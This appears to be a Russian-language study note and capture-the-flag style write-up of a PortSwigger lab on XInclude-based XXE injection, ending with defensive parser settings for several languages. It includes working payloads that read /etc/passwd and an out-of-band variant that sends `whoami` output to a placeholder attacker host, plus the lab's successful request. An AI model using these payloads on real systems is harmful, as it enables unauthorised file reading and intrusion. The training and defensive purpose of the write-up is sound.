доп инфа под лабу
## Поиск скрытой поверхности атаки для инъекции XXE
#### (XInclude атаки) бывает так, что XME уязвимость можно найти даже там, где нет самого XML !

>XML Inclusions — рекомендация Консорциума Всемирной паутины, которая описывает механизм включений в XML-документы текстовых файлов или других XML-документов
### cлучаи когда сам xml находится на стороне сервера, и в него подставляются данные приходящие с сайта! (некие такие - скрытые XML )

Некоторые приложения получают данные, отправленные клиентом,
встраивают их на стороне сервера в XML-документ, 
а затем анализируют документ.

Пример этого происходит, когда данные, отправленные клиентом, помещаются в серверный SOAP-запрос, который затем обрабатывается серверной SOAP-службой.

# тут я уже не могу изменить документ DOCTYPE но можно использовать `XInclude`.

`XInclude`. `XInclude` - это часть спецификации XML, которая позволяет создавать XML-документ из вложенных документов!

-----

Чтобы выполнить `XInclude` атаку, нужно обратиться к пространству имен `XInclude` и указать путь к файлу, который  хотим подключить. Например:
```xml

<foo xmlns:xi="http://www.w3.org/2001/XInclude"> <xi:include parse="text" href="file:///etc/passwd"/></foo>
```

----

**Oтправляю на сервер параметр:** `"Иван"` (просто имя)  
**Сервер делает:** `"<user>Иван</user>"` и парсит этот XML


  **XInclude** — механизм, который позволяет **вставлять в XML внешние файлы**.


**Oтправляю на сервер параметр:** 
```xml
user=<foo xmlns:xi="http://www.my.mymy/XInclude"><xi:include parse="text" href="file:///etc/passwd"/></foo>
```
**Сервер делает:**   
```xml
<user>
  <foo xmlns:xi="http://www.w3.org/2001/XInclude">
    root:x:0:0:root:/root:/bin/bash
    daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
    ...
  </foo>
</user>
```
-------

## короче говоря,     `<foo>новые-данные<xi:include данные/></foo>`    позволяет вставить в xml что угодно и тем самым создать подраздел новый `<foo>` — это просто `контейнер-обертка`



если обычный XXE можно обнаружить находя сам XML в запросах
	то XInclude XXE можно найти только если подставлять во все параметры пейлоады `<foo>новые-данные</foo>`
почти в слепую и смотреть результат!

# запросы для тестирования параметра на XXE:
### (пробовать заставить сделать запрос к моему серверу) + (проверка на Blind)
```xml
<foo xmlns:xi="http://www.w3.org/2001/XInclude">
<xi:include href="http://МОЙ.oast.fun/xxe-test"/>
</foo>


```

### (пробовать прочитать файлы)
```xml
<foo xmlns:xi="http://www.w3.org/2001/XInclude">
<xi:include parse="text" href="file:///etc/passwd"/>
</foo>
```

### (### Если ответа нет (тогда Blind))
```xml
<foo xmlns:xi="http://www.w3.org/2001/XInclude">
<xi:include href="http://ТВОЙ-САЙТ.oast.fun/`whoami`"/>
</foo>
```


------

ЛАБА
https://portswigger.net/web-security/xxe/lab-xinclude-attack
# Exploiting XInclude to retrieve files
задание: прочесть файл /etc/passwd в функции проверки чисда запасов на складе

-----
приступаю к решению:

исхожный запрос 
```http
POST /product/stock HTTP/2
Host: 0a1f000b04f3152f8083f36a0047002b.web-security-academy.net
Cookie: session=ee3oeNfRtGqcYIMOQPgDflpdiAtzFt2M
Content-Length: 21
Sec-Ch-Ua-Platform: "macOS"
Accept-Language: ru-RU,ru;q=0.9
Sec-Ch-Ua: "Not(A:Brand";v="8", "Chromium";v="144"
Content-Type: application/x-www-form-urlencoded
Sec-Ch-Ua-Mobile: ?0
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/144.0.0.0 Safari/537.36
Accept: */*
Origin: https://0a1f000b04f3152f8083f36a0047002b.web-security-academy.net
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: cors
Sec-Fetch-Dest: empty
Referer: https://0a1f000b04f3152f8083f36a0047002b.web-security-academy.net/product?productId=1
Accept-Encoding: gzip, deflate, br
Priority: u=1, i

productId=1&storeId=1


-----
респонс

HTTP/2 200 OK
Content-Type: text/plain; charset=utf-8
X-Frame-Options: SAMEORIGIN
Content-Length: 3

**579**
```



мой ошибочный запрос  

```http

<foo><xi:include+parse="text"+href="file:///etc/passwd"/></foo>
```
ответ сразу мне показал что мои введенные параметры попадют напрямую сразу в XML парсер
```http
HTTP/2 400 Bad Request
Content-Type: application/json; charset=utf-8
X-Frame-Options: SAMEORIGIN
Content-Length: 180

"XML parser exited with error: org.xml.sax.SAXParseException; lineNumber: 3; columnNumber: 73; The prefix "xi" for element "xi:include" is not bound."
```

###### ошибка в том, что необходимо указать пространсто имен!
нужно показать парсеру - что ему нужно работать с **текстовый идентификатор**, который говорит XML-парсеру: _«В этом документе используется язык XInclude версии 2001 года»_

поэтому нужно сперва указать 
```xml
<foo xmlns:xi="http://www.w3.org/2001/XInclude">
```


получилось! правильный запрос :
```http

productId=<foo+xmlns:xi="http://www.w3.org/2001/XInclude"><xi:include+parse="text"+href="file:///etc/passwd"/></foo>&storeId=1

```

в ответе пришел файл:

<img src="../../assets/Снимок экранаXML_(XXE)13.03.024.png" alt="Скрин" style="width: 90%; max-width: 1000px;" />



лаба решена!


## способы защиты от xxe  XInclude:



###### ОТКЛЮЧИТЬ ОБРАБОТКУ DTD (DOCTYPE) И ВНЕШНИХ СУЩНОСТЕЙ
Если парсеру запретить обрабатывать `DOCTYPE` и внешние ссылки, XXE просто нечему будет работать



для (Java):** ### Отключить XInclude
```java

factory.setFeature("http://apache.org/xml/features/disallow-doctype-decl", true);
factory.setFeature("http://xml.org/sax/features/external-general-entities", false);
factory.setFeature("http://xml.org/sax/features/external-parameter-entities", false);


factory.setXIncludeAware(false);
```
**Пример (PHP):**
```php
libxml_disable_entity_loader(true);
```
**Пример (.NET):**
```csharp
XmlReaderSettings settings = new XmlReaderSettings();
settings.DtdProcessing = DtdProcessing.Prohibit; // или Ignore
```
###### ИСПОЛЬЗОВАТЬ JSON ВМЕСТО XML
- JSON тоже может быть уязвим (JSON injection, prototype pollution) — но XXE там нет
JSON **не поддерживает** DTD и сущности — XXE там просто невозможен [](https://www.tencentcloud.com/techpedia/117813)[](https://www.oreilly.com/library/view/wang-luo-ying-yong-cheng-xu-an-quan/9798341659544/ch24.html). 
Если API может принимать JSON — используй его. 
Меньше функционала = меньше дыр.

###### не возвращать логи ошибок на клиент!!!
ошибки не должны выходить наружу!
###### ВСЕГДА ЯВНО НАСТРАИВАТЬ ПАРСЕР

Никогда не полагайся на настройки "по умолчанию"  в парсерах / библиотеках — они часто опасны [](https://docs.veracode.com/r/xxe-processing#what-are-xxe-attacks)[](https://www.oreilly.com/library/view/wang-luo-ying-yong-cheng-xu-an-quan/9798341659544/ch24.html). В каждом языке/библиотеке надо **целенаправленно запретит**ь
- `DOCTYPE`
- Внешние сущности (`SYSTEM`, `PUBLIC`)
- XInclude (если не нужно)



###### Валидация входных данных

Не только отключать фичи, но и:

- **Белый список разрешённых тегов**
- Проверка, что это действительно XML, а не бинарный мусор
- Ограничение размера (чтобы не выкачали 1 ГБ файл)

######  Запрет доступа к файловой системе

На уровне ОС/контейнера:

- Запускать парсер от пользователя **без прав на чтение системных файлов**
- chroot / контейнер с read-only FS
- AppArmor / SELinux — запрет на чтение `/etc/`, `/home/` и т.д.


---------


